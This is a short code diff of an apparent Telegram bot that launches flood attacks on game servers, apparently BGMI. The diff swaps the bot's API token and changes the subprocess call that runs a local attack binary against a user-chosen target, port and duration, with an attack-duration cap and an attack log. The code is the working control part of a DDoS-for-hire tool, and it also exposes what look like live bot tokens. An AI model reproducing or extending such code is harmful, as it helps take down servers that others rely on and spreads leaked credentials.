@@ -21,7 +21,7 @@ MAX_ATTACK_DURATION = 240
 USER_ACCESS_FILE = "user_access.txt"
 ATTACK_LOG_FILE = "attack_log.txt"
 OWNER_ID = "6442837812"
-bot = telebot.TeleBot('87674857613:AAEpC3RZXZJRVuI4z4NbR08v80HlAPiA7A0')
+bot = telebot.TeleBot('7870615572:AAEFfVF9oaj9HkG9aR5f1RHuCCiUbFaMl5U')
 
 # Auto-convert backup file on first run
 if not os.path.exists(USER_ACCESS_FILE) and os.path.exists("user_access_backup.txt"):
@@ -280,7 +280,7 @@ def handle_bgmi(message):
     
     try:
         subprocess.Popen(
-       ["./aadi", target, str(port), str(duration), "900"],
+       ["./Sagar", target, str(port), str(duration)],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL
         )
